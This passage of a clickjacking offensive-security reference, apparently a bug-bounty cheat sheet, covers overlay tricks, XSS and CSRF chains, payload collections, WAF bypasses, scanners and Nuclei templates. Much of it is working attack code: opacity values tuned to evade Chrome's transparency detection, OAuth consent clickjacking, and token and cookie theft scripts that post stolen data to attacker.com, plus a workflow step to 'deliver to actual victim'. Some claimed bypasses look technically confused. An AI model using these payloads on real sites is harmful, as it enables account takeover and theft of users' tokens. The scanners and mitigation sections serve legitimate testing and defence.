form.querySelector('input[name="username"]').focus();

// Detect autofill dropdown and hide it
setTimeout(() => {
    const dropdown = document.querySelector('[data-password-manager]');
    if (dropdown) dropdown.style.opacity = '0';
}, 100);
```

---

## 14. Transparent Overlay Techniques

### 14.1 Opacity-Based Transparency

```css
/* Standard transparent overlay */
.invisible-overlay {
    opacity: 0;
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 9999;
}
```

### 14.2 Near-Zero Opacity (Bypassing Detection)

```css
/* Chrome 76+ detection bypass */
.stealth-overlay {
    opacity: 0.0001;  /* Below detection threshold but invisible to users */
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 2;
}
```

### 14.3 Visibility Hidden + Display Block Trick

```css
/* Some browsers handle visibility differently */
.trick-overlay {
    visibility: hidden;  /* Hidden from view but still in layout */
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
}
```

### 14.4 Color-Matching Overlay

```css
/* Match background color exactly */
.camouflage-overlay {
    background: #ffffff;  /* Match page background */
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 2;
}
```

### 14.5 Pointer-Events None Overlay

```css
/* Clicks pass through to iframe below */
.pass-through {
    pointer-events: none;
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 2;
}
```

### 14.6 Blur/Filter Overlay

```css
/* Use CSS filters to obscure content while keeping it clickable */
.blur-overlay {
    filter: blur(100px);
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 2;
}
```

---

## 15. DOM XSS + Clickjacking Chains

### 15.1 Self-XSS via Clickjacking

When a self-XSS requires user interaction (clicking a button) and the page is frameable:

```html
<!-- Attacker pre-populates XSS payload via GET params, clickjacks the submit -->
<iframe src="https://target.com/profile?bio=<script>alert(1)</script>"></iframe>
```

### 15.2 DOM XSS Source + Clickjacking Sink

```javascript
// Vulnerable victim code
var hash = location.hash;
document.getElementById('output').innerHTML = decodeURIComponent(hash.substring(1));
```

```html
<!-- Attacker frames the page with XSS in hash, clickjacks to trigger -->
<iframe src="https://target.com/page#<img src=x onerror=alert(1)>"></iframe>
```

### 15.3 postMessage-triggered DOM XSS via Clickjacking

```html
<!-- Attacker frames page, sends postMessage with XSS payload after clickjacking -->
<iframe id="target" src="https://victim.com/postmessage-receiver"></iframe>
<script>
    document.getElementById('target').contentWindow.postMessage(
        '<img src=x onerror=alert(document.cookie)>',
        '*'
    );
</script>
```

### 15.4 CSP Bypass via Clickjacking + DOM XSS

If CSP allows `unsafe-inline` or whitelisted domains:

```
Content-Security-Policy: script-src 'self' 'unsafe-inline' https://cdn.example.com;
```

Clickjacking can trigger inline event handlers that bypass CSP restrictions.

---

## 16. CSRF + Clickjacking Chains

### 16.1 CSRF Token Bypass via Clickjacking

Clickjacking attacks are NOT mitigated by CSRF tokens because:
1. Target session is established with content loaded from authentic website
2. All requests happen on-domain
3. CSRF tokens are placed into requests as part of a normally behaved session

```html
<!-- CSRF token is automatically included in the framed session -->
<iframe src="https://target.com/change-email?email=attacker@evil.com"></iframe>
```

### 16.2 Double-Submit Cookie + Clickjacking

If the application uses double-submit cookie pattern:
- The cookie is sent automatically in the iframe
- The token in the form is also present
- Clickjacking submits the form with both values

### 16.3 SameSite=None Cookie + Clickjacking

```
Set-Cookie: session=abc123; SameSite=None; Secure;
```

With `SameSite=None`, cookies are sent in cross-site contexts including iframes, enabling authenticated clickjacking.

### 16.4 CSRF + Clickjacking + XSS Chain

```
1. Attacker clickjacks victim to submit form with XSS payload
2. XSS executes in victim's session
3. XSS performs CSRF to change victim's email
4. Attacker resets password via forgot password to new email
5. Account takeover complete
```

---

## 17. Token Theft Techniques

### 17.1 OAuth Token Theft via Clickjacking

```html
<!-- Frame OAuth callback to steal token from URL fragment -->
<iframe id="oauth-frame" src="https://target.com/oauth/callback#access_token=STOLEN"></iframe>
<script>
    // Read token from iframe URL (if same-origin)
    const token = document.getElementById('oauth-frame').contentWindow.location.hash;
</script>
```

### 17.2 postMessage Token Theft

```javascript
// Attacker listens for postMessage with tokens
window.addEventListener('message', function(event) {
    if (event.data.token || event.data.accessToken) {
        fetch('https://attacker.com/log?token=' + encodeURIComponent(event.data.token));
    }
});
```

### 17.3 Session Cookie Theft via Drag-and-Drop

```html
<div draggable="true" 
     ondragstart="event.dataTransfer.setData('text/plain', document.cookie)">
    Drag to verify
</div>
```

### 17.4 JWT Token Theft via Hidden iframe

```html
<!-- Frame a page that stores JWT in localStorage, read via XSS -->
<iframe src="https://target.com/app" style="opacity:0"></iframe>
<script>
    // If same-origin or XSS in iframe, extract JWT
    const jwt = localStorage.getItem('jwt_token');
</script>
```

---

## 18. Browser Quirks

### 18.1 Chrome Transparency Detection

- Chrome 76+ applies threshold-based iframe transparency detection
- Threshold is approximately `opacity: 0.00001` to `0.0001`
- Using values below threshold bypasses detection
- Detection applies to cross-origin iframes only

### 18.2 Firefox Behavior

- Firefox does NOT apply transparency detection
- Firefox allows text drag-and-drop INTO iframes (but not out)
- Firefox handles `designMode` differently than Chrome

### 18.3 Safari Quirks

- Safari follows Chromium behavior for transparency detection
- Safari handles `sandbox` attribute similarly to Chrome
- iOS Safari has additional restrictions on iframe sizing

### 18.4 IE/Edge Legacy

- IE 11: X-Frame-Options takes priority over frame-ancestors
- Edge Legacy: Same behavior as IE 11
- Edge (Chromium): Follows standard Chromium behavior

### 18.5 Mobile Browser Differences

- Mobile Safari: Touch events may behave differently than click events
- Chrome Android: Same as desktop Chrome for iframe policies
- Samsung Internet: Based on Chromium, similar behavior

### 18.6 SameSite Cookie Defaults

| Browser | Default SameSite | Notes |
|---------|-----------------|-------|
| Chrome 80+ | Lax | Changed in Feb 2020 |
| Firefox 69+ | Lax | |
| Safari | None | Still defaults to None |
| Edge | Lax | |

### 18.7 window.opener Behavior

- `window.opener` is maintained across navigations in most browsers
- Can be used for DoubleClickjacking attacks
- `rel="noopener"` on links prevents this

---

## 19. Gadget Chains

### 19.1 Facebook SDK Gadget Chain

```javascript
// Force reinit to generate new PRNG outputs
FB.init({ xfbml: 1 });  // Forces XFBML.parse()
// Destroys/recreates plugin iframe, generating new names/callback IDs
```

### 19.2 jQuery UI Dialog Gadget

```javascript
// If target uses jQuery UI dialogs that can be framed
// Dialog buttons can be clickjacked to perform actions
$("#dialog").dialog({
    buttons: {
        "Delete Account": function() {
            // Sensitive action
        }
    }
});
```

### 19.3 React/Vue Component Gadgets

```javascript
// Modern SPA frameworks may expose actions via DOM attributes
// Look for data-action, data-method attributes on buttons
```

### 19.4 postMessage Gadget Probes

```javascript
// Probe for postMessage handlers
const probes = [
    { action: 'init' },
    { action: 'getToken' },
    { action: 'getUser' },
    { action: 'logout' },
    { type: 'request', data: {} }
];

probes.forEach(p => {
    window.parent.postMessage(p, '*');
});
```

---

## 20. Real World Case Studies

### 20.1 Adobe Flash Settings Clickjacking (2008)

The original high-profile clickjacking attack. Attackers loaded the Flash plugin settings page in an invisible iframe, tricking users into giving Flash animations access to the computer's camera and microphone.

**Impact**: Changed Flash security model, led to clickjacking awareness.

### 20.2 Twitter Clickjacking Worm (2009)

A clickjacking attack convinced users to click a button which caused them to re-tweet the location of the malicious page, propagating massively.

**Mechanism**: Invisible Tweet button overlay on a decoy page.

### 20.3 Facebook Likejacking (2010-2012)

Attackers tricked logged-in Facebook users to arbitrarily like fan pages, links, groups.

**Technique**: Transparent iframe with Facebook Like button overlaid on enticing content.

### 20.4 Google OAuth Double-Click Attack (Microsoft Research)

Researchers demonstrated a bait-and-switch double-click attack against Google's OAuth dialog, which was protected with X-Frame-Options.

**Technique**: After first click, attacker switched in the Google OAuth popup under the cursor right before the second click.

### 20.5 Password Manager Clickjacking (2024-2025)

Marek Toth demonstrated DOM-based extension clickjacking against password managers.

**Affected**: 1Password, Bitwarden, LastPass, iCloud Passwords (32.7M installations)

**Technique**: Invisible login form triggers autofill dropdown, which is then hidden and clickjacked.

### 20.6 DoubleClickjacking on Major Platforms (2025)

Paulos Yibelo demonstrated DoubleClickjacking on:
- Shopify (OAuth authorization)
- Slack (permissions)
- Salesforce (internal actions)
- Spotify (account linking)
- Browser crypto wallets (Web3 transaction authorization)

**Impact**: Bypasses ALL traditional clickjacking protections.

---

## 21. Fuzzing Payloads

### 21.1 Header Fuzzing for Frameability

```
# Test X-Frame-Options variations
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
X-Frame-Options: ALLOW-FROM https://attacker.com
X-Frame-Options: allow-from https://attacker.com
X-Frame-Options: 
X-Frame-Options: INVALID

# Test CSP frame-ancestors variations
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self'
Content-Security-Policy: frame-ancestors https://attacker.com
Content-Security-Policy: frame-ancestors *
Content-Security-Policy: frame-ancestors 'self' https://attacker.com
Content-Security-Policy: frame-ancestors none
Content-Security-Policy: frame-ancestors 'none' https://attacker.com
```

### 21.2 iframe Attribute Fuzzing

```html
<!-- Test various sandbox combinations -->
<iframe sandbox="allow-forms" src="https://target.com"></iframe>
<iframe sandbox="allow-scripts" src="https://target.com"></iframe>
<iframe sandbox="allow-forms allow-scripts" src="https://target.com"></iframe>
<iframe sandbox="allow-forms allow-scripts allow-same-origin" src="https://target.com"></iframe>
<iframe sandbox="allow-top-navigation" src="https://target.com"></iframe>
<iframe sandbox="" src="https://target.com"></iframe>

<!-- Test security attribute (IE) -->
<iframe security="restricted" src="https://target.com"></iframe>
```

### 21.3 CSS Property Fuzzing

```css
/* Test opacity values */
opacity: 0;
opacity: 0.0;
opacity: 0.00001;
opacity: 0.0001;
opacity: 0.001;
opacity: 0.01;
opacity: 0.1;

/* Test visibility combinations */
visibility: hidden;
visibility: visible;
display: none;
display: block;

/* Test pointer-events */
pointer-events: none;
pointer-events: auto;
pointer-events: all;
```

### 21.4 URL Parameter Fuzzing for Prefill

```
https://target.com/form?field1=test&field2=test&submit=true
https://target.com/form?email=attacker@evil.com&action=delete
https://target.com/form?csrf_token=test&new_password=hacked
```

---

## 22. Automation Workflows

### 22.1 Automated Clickjacking Detection Pipeline

```bash
#!/bin/bash
# clickjacking_scan.sh

TARGET=$1
OUTPUT_DIR="./results"

# Step 1: Check headers
echo "[*] Checking security headers..."
curl -sI "https://$TARGET" | grep -iE "(X-Frame-Options|Content-Security-Policy|frame-ancestors)" > "$OUTPUT_DIR/headers.txt"

# Step 2: Test frameability
echo "[*] Testing frameability..."
cat > "$OUTPUT_DIR/test.html" <<EOF
<!DOCTYPE html>
<html>
<body>
    <iframe src="https://$TARGET" width="100%" height="100%"></iframe>
</body>
</html>
EOF

# Step 3: Check for sensitive actions
echo "[*] Enumerating sensitive endpoints..."
gau "$TARGET" | grep -iE "(delete|remove|update|change|add|create|transfer)" > "$OUTPUT_DIR/sensitive_endpoints.txt"

# Step 4: Check cookie SameSite
echo "[*] Checking cookie attributes..."
curl -sI "https://$TARGET" | grep -i "Set-Cookie" | grep -i "SameSite"

# Step 5: Generate report
echo "[*] Generating report..."
```

### 22.2 Python Automation Script

```python
#!/usr/bin/env python3
"""Clickjacking vulnerability scanner"""

import requests
import sys
from urllib.parse import urljoin

class ClickjackingScanner:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        
    def check_headers(self):
        """Check for anti-clickjacking headers"""
        try:
            resp = self.session.head(self.target, timeout=10)
            headers = resp.headers
            
            xfo = headers.get('X-Frame-Options', 'NOT SET')
            csp = headers.get('Content-Security-Policy', 'NOT SET')
            
            print(f"[+] X-Frame-Options: {xfo}")
            print(f"[+] CSP: {csp}")
            
            if 'frame-ancestors' in csp:
                print("[+] frame-ancestors found in CSP")
            else:
                print("[!] frame-ancestors NOT found - potentially frameable")
                
            if xfo == 'NOT SET' and 'frame-ancestors' not in csp:
                print("[CRITICAL] No clickjacking protection detected!")
                return True
                
        except Exception as e:
            print(f"[!] Error: {e}")
            
    def generate_poc(self, endpoint, button_position):
        """Generate clickjacking PoC HTML"""
        poc = f"""<!DOCTYPE html>
<html>
<head>
<style>
    iframe {{
        position: relative;
        width: 1000px;
        height: 800px;
        opacity: 0.0001;
        z-index: 2;
    }}
    div {{
        position: absolute;
        top: {button_position['top']}px;
        left: {button_position['left']}px;
        z-index: 1;
    }}
</style>
</head>
<body>
    <div>Click me</div>
    <iframe src="{urljoin(self.target, endpoint)}"></iframe>
</body>
</html>"""
        return poc

if __name__ == "__main__":
    scanner = ClickjackingScanner(sys.argv[1])
    scanner.check_headers()
```

### 22.3 Burp Suite Clickbandit Workflow

```
1. Navigate to target page in Burp's browser
2. Perform the desired action (e.g., click Delete Account)
3. Right-click > "Copy as Clickbandit"
4. Burp generates HTML PoC automatically
5. Adjust opacity and positioning as needed
6. Test on victim account
7. Deliver to actual victim
```

---

## 23. Recon Methodology

### 23.1 Header Analysis Checklist

```
□ Check X-Frame-Options header
  □ Is it set? (DENY, SAMEORIGIN, ALLOW-FROM)
  □ Is ALLOW-FROM used? (obsolete, check browser support)
  □ Is it set as meta tag? (doesn't work)
  
□ Check Content-Security-Policy
  □ Is frame-ancestors present?
  □ What values? ('none', 'self', specific domains)
  □ Is it in report-only mode?
  □ Is syntax correct?
  
□ Check cookies
  □ SameSite attribute (Strict, Lax, None)
  □ Secure attribute
  □ HttpOnly attribute
  
□ Check for frame-busting scripts
  □ JavaScript frame busters
  □ Body display:none technique
  □ window.confirm() protection
```

### 23.2 Endpoint Enumeration

Look for endpoints that:
1. Perform state-changing actions via GET
2. Have buttons/links that perform sensitive actions
3. Allow form prefill via URL parameters
4. Have OAuth/authorization flows
5. Have file upload/download buttons
6. Have "Delete", "Remove", "Transfer", "Update" in URL

### 23.3 Frameability Testing

```html
<!-- Quick test page -->
<!DOCTYPE html>
<html>
<body>
    <h1>Frameability Test</h1>
    <iframe src="https://target.com" width="800" height="600"></iframe>
</body>
</html>
```

### 23.4 Sensitive Action Identification

```javascript
// JavaScript to identify clickable sensitive elements
const sensitiveKeywords = ['delete', 'remove', 'update', 'change', 'transfer', 'pay', 'submit'];
document.querySelectorAll('button, input[type="submit"], a').forEach(el => {
    const text = el.textContent.toLowerCase();
    if (sensitiveKeywords.some(k => text.includes(k))) {
        console.log('Sensitive element found:', el);
        console.log('Position:', el.getBoundingClientRect());
    }
});
```

---

## 24. Nuclei Templates

### 24.1 Basic Clickjacking Detection Template

```yaml
id: clickjacking-detection

info:
  name: Clickjacking Detection
  author: security-researcher
  severity: medium
  description: Detects missing X-Frame-Options and CSP frame-ancestors headers
  tags: clickjacking, misconfiguration

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    
    matchers:
      - type: dsl
        dsl:
          - '!contains(tolower(header), "x-frame-options")'
          - '!contains(tolower(header), "frame-ancestors")'
        condition: and
    
    extractors:
      - type: regex
        regex:
          - "(?i)X-Frame-Options: .*"
          - "(?i)Content-Security-Policy: .*"
```

### 24.2 Weak X-Frame-Options Detection

```yaml
id: weak-xfo-clickjacking

info:
  name: Weak X-Frame-Options Configuration
  author: security-researcher
  severity: medium
  description: Detects weak or obsolete X-Frame-Options values
  tags: clickjacking, misconfiguration

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    
    matchers:
      - type: regex
        regex:
          - "(?i)X-Frame-Options: ALLOW-FROM"
          - "(?i)X-Frame-Options: SAMEORIGIN"
        condition: or
    
    extractors:
      - type: regex
        regex:
          - "(?i)X-Frame-Options: .*"
```

### 24.3 CSP frame-ancestors Bypass Detection

```yaml
id: csp-frame-ancestors-bypass

info:
  name: CSP frame-ancestors Bypass
  author: security-researcher
  severity: high
  description: Detects weak CSP frame-ancestors configurations
  tags: clickjacking, csp, misconfiguration

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    
    matchers:
      - type: regex
        regex:
          - "(?i)frame-ancestors\s+\*"
          - "(?i)frame-ancestors\s+none"
          - "(?i)frame-ancestors\s+http:"
        condition: or
    
    extractors:
      - type: regex
        regex:
          - "(?i)Content-Security-Policy: .*"
```

### 24.4 SameSite Cookie Detection

```yaml
id: samesite-cookie-check

info:
  name: SameSite Cookie Configuration
  author: security-researcher
  severity: info
  description: Checks SameSite cookie attributes
  tags: clickjacking, cookies, configuration

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    
    matchers:
      - type: regex
        regex:
          - "(?i)Set-Cookie:.*SameSite=None"
          - "(?i)Set-Cookie:.*SameSite=Lax"
          - "(?i)Set-Cookie:.*SameSite=Strict"
        condition: or
    
    extractors:
      - type: regex
        regex:
          - "(?i)Set-Cookie: .*"
```

### 24.5 Frame Buster Detection

```yaml
id: frame-buster-detection

info:
  name: JavaScript Frame Buster Detection
  author: security-researcher
  severity: info
  description: Detects client-side frame busting scripts
  tags: clickjacking, frame-buster, javascript

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    
    matchers:
      - type: regex
        regex:
          - "top.location\s*=\s*self.location"
          - "if\s*\(top\s*!=\s*self\)"
          - "antiClickjack"
          - "frame-bust"
        condition: or
    
    extractors:
      - type: regex
        regex:
          - "<script>.*top.location.*</script>"
```

### 24.6 Nuclei Scanning Commands

```bash
# Basic clickjacking scan
nuclei -u https://target.com -t http/misconfiguration/clickjacking/

# Full scan with all clickjacking templates
nuclei -u https://target.com -t http/misconfiguration/clickjacking/ -severity medium,high,critical

# Scan multiple targets
nuclei -l targets.txt -t http/misconfiguration/clickjacking/

# Output results
nuclei -u https://target.com -t clickjacking-detection.yaml -o clickjacking-results.txt
```

---

## 25. Tools and Scanners

### 25.1 Burp Suite Clickbandit

**Usage**:
1. Install from BApp Store
2. Navigate to target page
3. Click the extension icon
4. Perform the action you want to clickjack
5. Clickbandit generates the PoC HTML
6. Adjust opacity and positioning
7. Save and deliver

### 25.2 OWASP ZAP

```bash
# ZAP can detect missing anti-clickjacking headers
zap-cli quick-scan --self-contained --start-options "-config api.disablekey=true" https://target.com
```

### 25.3 Clickjack Scanner (machine1337)

```bash
# Install
git clone https://github.com/machine1337/clickjack
cd clickjack
pip install -r requirements.txt

# Run
python clickjack.py -u https://target.com
```

### 25.4 Custom Python Scanner

```python
#!/usr/bin/env python3
"""Advanced Clickjacking Scanner"""

import requests
import argparse
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

class AdvancedClickjackingScanner:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.findings = []
        
    def scan_headers(self):
        """Comprehensive header analysis"""
        resp = self.session.head(self.target, allow_redirects=True)
        headers = {k.lower(): v for k, v in resp.headers.items()}
        
        # Check X-Frame-Options
        xfo = headers.get('x-frame-options', 'NOT SET')
        if xfo == 'NOT SET':
            self.findings.append({
                'severity': 'HIGH',
                'issue': 'Missing X-Frame-Options header',
                'remediation': 'Add X-Frame-Options: DENY or SAMEORIGIN'
            })
        elif 'allow-from' in xfo.lower():
            self.findings.append({
                'severity': 'MEDIUM',
                'issue': 'Obsolete ALLOW-FROM directive',
                'remediation': 'Use CSP frame-ancestors instead'
            })
            
        # Check CSP
        csp = headers.get('content-security-policy', 'NOT SET')
        if csp == 'NOT SET':
            self.findings.append({
                'severity': 'HIGH',
                'issue': 'Missing Content-Security-Policy',
                'remediation': 'Add CSP with frame-ancestors directive'
            })
        elif 'frame-ancestors' not in csp.lower():
            self.findings.append({
                'severity': 'HIGH',
                'issue': 'CSP missing frame-ancestors directive',
                'remediation': 'Add frame-ancestors none or self'
            })
            
        # Check cookies
        cookies = headers.get('set-cookie', '')
        if 'samesite' not in cookies.lower():
            self.findings.append({
                'severity': 'MEDIUM',
                'issue': 'Cookies missing SameSite attribute',
                'remediation': 'Add SameSite=Strict or Lax to session cookies'
            })
            
        return self.findings
    
    def find_sensitive_actions(self):
        """Find potentially clickjackable actions"""
        resp = self.session.get(self.target)
        soup = BeautifulSoup(resp.text, 'html.parser')
        
        sensitive_keywords = ['delete', 'remove', 'update', 'change', 'transfer', 
                             'pay', 'submit', 'authorize', 'confirm', 'approve']
        
        actions = []
        for element in soup.find_all(['button', 'input', 'a']):
            text = element.get_text(strip=True).lower()
            if any(kw in text for kw in sensitive_keywords):
                actions.append({
                    'element': str(element)[:100],
                    'text': text,
                    'type': element.name
                })
        
        return actions
    
    def generate_report(self):
        """Generate comprehensive report"""
        print("=" * 60)
        print("CLICKJACKING VULNERABILITY REPORT")
        print("=" * 60)
        print(f"Target: {self.target}")
        print("=" * 60)
        
        for finding in self.findings:
            print(f"[{finding['severity']}] {finding['issue']}")
            print(f"  -> {finding['remediation']}")
            print()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    args = parser.parse_args()
    
    scanner = AdvancedClickjackingScanner(args.url)
    scanner.scan_headers()
    scanner.generate_report()
```

### 25.5 Browser Extension Tools

- **BrowExt - ClickJacking**: Browser extension for testing clickjacking
- **Clickjacker.io**: Online clickjacking PoC generator
- **PostMessage Tracker**: For postMessage vulnerability analysis

---

## 26. Advanced Research

### 26.1 Microsoft Research: InContext Defense

Microsoft Research proposed "InContext" - a defense that validates three integrity properties:

1. **Display Integrity**: Element must be fully visible
2. **Pointer Integrity**: Cursor must be over the element
3. **Temporal Integrity**: Element must be visible for minimum time

**Limitation**: Not widely adopted in browsers.

### 26.2 PortSwigger Research: Browser-Powered Desync

James Kettle's research on using clickjacking as part of browser-powered desync attacks:
- Combining clickjacking with HTTP request smuggling
- Using iframe-based attacks to trigger desync conditions
- Novel techniques for bypassing front-end security

### 26.3 DOM Clobbering + Clickjacking

PortSwigger research on DOM clobbering combined with clickjacking:
- Using DOM clobbering to modify frame-busting scripts
- Combining with prototype pollution for gadget chains
- New vectors in modern JavaScript frameworks

### 26.4 CSP Policy Injection

PortSwigger research on bypassing CSP via policy injection:
- Injecting additional CSP directives via framing
- Using meta tags to override headers in some contexts
- Combining with clickjacking for full exploitation

### 26.5 Hidden OAuth Attack Vectors

PortSwigger research on OAuth vulnerabilities:
- Clickjacking OAuth consent screens
- Hidden redirect_uri manipulation
- State parameter bypass techniques

### 26.6 Client-Side Prototype Pollution

BlackFan's research on client-side prototype pollution:
- Using clickjacking to trigger prototype pollution gadgets
- Combining with XSS for DOM manipulation
- Gadget chains in popular JavaScript libraries

---

## 27. Bug Bounty Writeups

### 27.1 Key Writeup Patterns

**Successful clickjacking bug bounty reports typically include:**

1. **Clear impact statement**: What can an attacker do?
2. **Step-by-step reproduction**: Exact PoC with screenshots
3. **Video demonstration**: Screen recording of the attack
4. **Affected endpoints**: Specific URLs and parameters
5. **Mitigation suggestions**: How to fix

### 27.2 Impact Escalation Techniques

| Base Finding | Escalation Path | Final Impact |
|-------------|----------------|--------------|
| Clickjacking Like button | Chain with OAuth | Account linking/takeover |
| Clickjacking email change | Chain with password reset | Full account takeover |
| Clickjacking form submit | Chain with XSS | Stored XSS execution |
| Clickjacking file upload | Chain with path traversal | RCE |
| Clickjacking "Delete" | Direct impact | Data loss |

### 27.3 Report Template

```markdown
# Clickjacking Vulnerability Report

## Summary
[One-line summary of the vulnerability]

## Affected URL(s)
- https://target.com/sensitive-endpoint

## Severity
[Critical/High/Medium/Low]

## Description
[Detailed description of the vulnerability]

## Steps to Reproduce
1. Visit https://attacker.com/poc.html
2. Click the "Win Prize" button
3. Observe that account email has been changed

## Proof of Concept
[Paste PoC HTML here]

## Impact
[What can an attacker achieve?]

## Mitigation
- Implement X-Frame-Options: DENY
- Add CSP frame-ancestors 'none'
- Use SameSite=Strict cookies
- Implement user confirmation dialogs

## References
- [PortSwigger Clickjacking](https://portswigger.net/web-security/clickjacking)
- [OWASP Clickjacking Defense](https://owasp.org/www-community/attacks/Clickjacking)
```

---

## 28. Payload Collections

### 28.1 Basic Clickjacking Payloads

```html
<!-- Payload 1: Basic transparent overlay -->
<style>
    iframe { opacity: 0; position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2; }
</style>
<iframe src="TARGET"></iframe>
<div style="position:absolute; top:0; left:0; z-index:1;">Click here</div>

<!-- Payload 2: Cropped button overlay -->
<style>
    iframe { position: absolute; top: 300px; left: 50px; width: 100px; height: 40px; opacity: 0; z-index: 2; }
</style>
<div style="position:absolute; top:300px; left:50px;">Click me</div>
<iframe src="https://target.com/action"></iframe>

<!-- Payload 3: Pointer-events bypass -->
<style>
    .overlay { pointer-events: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2; }
    iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
</style>
<div class="overlay"><img src="decoy.jpg" width="100%" height="100%"></div>
<iframe src="https://target.com"></iframe>
```

### 28.2 Frame-Buster Bypass Payloads

```html
<!-- Payload 4: Sandbox bypass -->
<iframe src="https://target.com" sandbox="allow-forms allow-scripts"></iframe>

<!-- Payload 5: Double frame nesting -->
<iframe src="attacker2.html"></iframe>
<!-- attacker2.html contains: -->
<iframe src="https://target.com"></iframe>

<!-- Payload 6: onBeforeUnload bypass -->
<script>
    window.onbeforeunload = function() { return "Leave?"; };
</script>
<iframe src="https://target.com"></iframe>

<!-- Payload 7: 204 No Content bypass -->
<script>
    var prevent_bust = 0;
    window.onbeforeunload = function() { prevent_bust++; };
    setInterval(function() {
        if (prevent_bust > 0) {
            prevent_bust -= 2;
            window.top.location = "http://attacker.com/204.php";
        }
    }, 1);
</script>
<iframe src="https://target.com"></iframe>
```

### 28.3 DoubleClickjacking Payloads

```html
<!-- Payload 8: Popup-based DoubleClickjacking -->
<script>
let w;
window.onclick = () => {
    if (!w) w = window.open('/shim', 'pj', 'width=360,height=240');
    window.onmousemove = e => { 
        try { w.moveTo(e.screenX, e.screenY); } catch {} 
    };
    window.open('', 'pj');
};
</script>

<!-- Payload 9: window.opener DoubleClickjacking -->
<script>
function exploit() {
    const popup = window.open('about:blank', 'auth', 'width=400,height=300');
    popup.document.write(`
        <button id="btn">Double-click to verify</button>
        <script>
            document.getElementById('btn').addEventListener('mousedown', function() {
                window.opener.location = 'https://target.com/oauth/authorize?client_id=ATTACKER';
                window.close();
            });
        <\/script>
    `);
}
</script>
<button onclick="exploit()">Start</button>
```

### 28.4 Drag-and-Drop Payloads

```html
<!-- Payload 10: File theft via drag-and-drop -->
<div id="drop-zone" style="position:absolute; top:0; left:0; width:100%; height:100%; opacity:0; z-index:2;"></div>
<div style="position:absolute; top:0; left:0; z-index:1;">
    <h1>File Organizer</h1>
    <p>Drag sensitive files here to organize them</p>
</div>
<iframe src="https://attacker.com/receiver" style="opacity:0;"></iframe>

<!-- Payload 11: Text injection via drag-and-drop -->
<div id="payload" draggable="true" 
     ondragstart="event.dataTransfer.setData('text/plain', 'attacker@evil.com')">
    Drag me to the form
</div>
<iframe src="https://target.com/form"></iframe>
```

### 28.5 OAuth Clickjacking Payloads

```html
<!-- Payload 12: OAuth authorization clickjacking -->
<style>
    iframe { position: relative; width: 600px; height: 500px; opacity: 0.0001; z-index: 2; }
    div { position: absolute; top: 420px; left: 450px; z-index: 1; }
</style>
<div>Click to continue</div>
<iframe src="https://accounts.google.com/o/oauth2/auth?client_id=ATTACKER&scope=email"></iframe>

<!-- Payload 13: OAuth token theft -->
<iframe id="oauth" src="https://target.com/oauth/callback#access_token=TOKEN"></iframe>
<script>
    setTimeout(() => {
        const hash = document.getElementById('oauth').contentWindow.location.hash;
        fetch('https://attacker.com/log?token=' + encodeURIComponent(hash));
    }, 2000);
</script>
```

### 28.6 postMessage + Clickjacking Payloads

```html
<!-- Payload 14: postMessage token theft -->
<iframe id="target" src="https://victim.com/widget"></iframe>
<script>
    window.addEventListener('message', function(e) {
        if (e.data.token) {
            fetch('https://attacker.com/collect', {
                method: 'POST',
                body: JSON.stringify(e.data)
            });
        }
    });
    document.getElementById('target').contentWindow.postMessage({action: 'getToken'}, '*');
</script>

<!-- Payload 15: postMessage XSS via clickjacking -->
<iframe id="target" src="https://vulnerable.com/receiver"></iframe>
<script>
    const payload = '<img src=x onerror=alert(document.cookie)>';
    document.getElementById('target').contentWindow.postMessage(payload, '*');
</script>
```

---

## 29. WAF Bypasses

### 29.1 Header Case Variation

```
# Some WAFs are case-sensitive
x-frame-options: deny
X-FRAME-OPTIONS: DENY
X-Frame-Options: DENY
```

### 29.2 Multiple Header Injection

```
# Confuse WAF with multiple headers
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
```

### 29.3 Encoding Tricks

```
# URL-encoded values
X-Frame-Options: %44%45%4E%59
Content-Security-Policy: frame-ancestors%20%27none%27
```

### 29.4 Header Injection via CRLF

```
# If response splitting is possible
GET /?param=value%0d%0aX-Frame-Options:%20DENY HTTP/1.1
```

### 29.5 Cache Poisoning for WAF Bypass

```
# Poison cache to serve page without protective headers
GET /?cachebuster=1 HTTP/1.1
X-Frame-Options: DENY

# Subsequent requests may get cached version without headers
```

---

## 30. Detection Techniques

### 30.1 Automated Detection

```python
# Python script for automated clickjacking detection
import requests
from urllib.parse import urlparse

def detect_clickjacking(url):
    findings = []
    
    try:
        resp = requests.head(url, timeout=10, allow_redirects=True)
        headers = {k.lower(): v for k, v in resp.headers.items()}
        
        # Check for missing protections
        if 'x-frame-options' not in headers and 'content-security-policy' not in headers:
            findings.append({
                'type': 'MISSING_PROTECTION',
                'severity': 'HIGH',
                'detail': 'No X-Frame-Options or CSP headers found'
            })
        
        # Check for weak XFO
        xfo = headers.get('x-frame-options', '')
        if 'allow-from' in xfo.lower():
            findings.append({
                'type': 'WEAK_XFO',
                'severity': 'MEDIUM',
                'detail': 'Obsolete ALLOW-FROM directive'
            })
        
        # Check CSP
        csp = headers.get('content-security-policy', '')
        if 'frame-ancestors' not in csp.lower():
            findings.append({
                'type': 'MISSING_FRAME_ANCESTORS',
                'severity': 'HIGH',
                'detail': 'CSP missing frame-ancestors directive'
            })
        
        # Check cookies
